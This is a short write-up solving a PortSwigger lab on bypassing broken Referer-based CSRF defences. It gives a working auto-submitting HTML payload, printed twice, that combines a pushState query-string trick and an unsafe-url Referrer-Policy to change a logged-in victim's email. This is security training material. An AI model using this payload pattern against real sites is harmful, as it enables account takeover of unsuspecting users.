# Lab: CSRF with broken Referer validation (Practitioner)

**Lab:** [https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-broken](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-broken)

**Task (from PortSwigger):**  
This lab's email change functionality is vulnerable to CSRF. It attempts to detect and block cross domain requests, but the detection mechanism can be bypassed.

Credentials: `wiener:peter`

## Vulnerability
Referer is accepted if it *contains* the lab domain anywhere (e.g. in the query string).

## Solution

Exploit server **Head**:
```
Referrer-Policy: unsafe-url
```

**Body:**
```html
<script>
    history.pushState("", "", "/?YOUR-LAB-ID.web-security-academy.net")
</script>
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="attacker@evil-user.net">
</form>
<script>
    document.forms[0].submit();
</script>
```

`Referrer-Policy: unsafe-url` keeps the query string in the Referer header.

## Final Exploit Payload
```html
<script>
    history.pushState("", "", "/?YOUR-LAB-ID.web-security-academy.net")
</script>
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="attacker@evil-user.net">
</form>
<script>
    document.forms[0].submit();
</script>
```
(+ header `Referrer-Policy: unsafe-url` on the exploit response)
